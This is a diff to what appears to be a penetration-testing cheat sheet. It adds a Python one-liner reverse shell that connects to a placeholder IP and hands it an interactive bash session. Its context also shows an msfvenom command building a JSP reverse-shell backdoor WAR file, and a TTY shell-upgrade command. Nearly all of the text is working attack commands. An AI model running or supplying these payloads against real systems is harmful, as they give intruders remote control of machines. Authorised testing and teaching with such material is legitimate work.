@@ -153,12 +153,18 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4449 -f war > backdoor.war
 ## Attempt to Elevate permissions after entry
 
 
+### Python based reverse shell
+
+```
+python3 -c 'import
+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' &
+```
 
 
 ### Upgrade Shell to TTY
 
 ```
-python -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
 
